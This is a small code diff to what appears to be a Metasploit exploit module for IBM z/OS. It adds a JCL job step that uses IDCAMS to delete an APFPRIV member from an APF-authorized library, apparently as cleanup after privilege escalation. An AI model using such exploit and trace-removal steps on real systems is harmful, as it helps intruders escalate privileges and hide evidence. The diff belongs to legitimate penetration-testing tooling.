@@ -145,6 +145,12 @@ module MetasploitModule
       " SETR RACL(FACILITY) REF\n" \
       "/*\n" \
       "//SYSIN     DD DUMMY\n" \
-      "//SYSTSPRT  DD SYSOUT=*\n"
+      "//SYSTSPRT  DD SYSOUT=*\n" \
+      "//S3        EXEC PGM=IDCAMS\n" \
+      "//SYSPRINT  DD SYSOUT=*\n" \
+      "//TEMPDD    DD DSN=#{datastore['APFLIB']},DISP=SHR\n" \
+      "//SYSIN     DD *\n" \
+      " DELETE #{datastore['APFLIB']}(APFPRIV) FILE(TEMPDD)\n" \
+      "/*\n" \
   end
 end
